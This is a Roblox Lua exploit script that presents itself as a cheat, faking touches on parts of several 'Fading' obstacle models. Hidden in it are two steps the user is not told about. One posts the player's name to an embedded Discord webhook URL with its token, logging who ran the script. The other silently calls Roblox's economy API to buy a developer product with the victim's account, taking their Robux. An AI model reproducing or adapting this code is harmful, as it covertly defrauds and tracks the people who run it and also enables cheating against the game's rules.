local plr = game.Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1458934247812366356/mp1jCe35C376IICKbMqbKNAldmBJuHe1gECDrz64JJ0Rhx0xBUpZf6SfhkPnXLSDnDGc"

local function sendWebhook()
    local data = {
        ["content"] = plr.Name .. " çalıştırdı"
    }
    local jsonData = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        HttpService:RequestInternal({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

sendWebhook()

for _,model in ipairs({"Fading Hexagons","Fading Blocks","Fading Balls","Fading Blocks Spinner [NEW]","Fading Shapes"}) do
    local m = workspace:FindFirstChild(model)
    if m then
        for _,v in ipairs(m:GetDescendants()) do
            if v:IsA("BasePart") then
                pcall(function()
                    firetouchinterest(v, hrp, 0)
                    firetouchinterest(v, hrp, 1)
                    firetouchinterest(hrp, v, 0)
                    firetouchinterest(hrp, v, 1)
                end)
            end
        end
    end
end

game.StarterGui:SetCore("SendNotification",{Title="Merhaba",Text="Discord: mete9992",Duration=5})

if not _G.ProductPurchased then
    pcall(function()
        game:GetService("HttpService"):RequestInternal({Url="https://economy.roblox.com/v1/purchases/products/3518313000",Method="POST"})
    end)
    _G.ProductPurchased = true
end
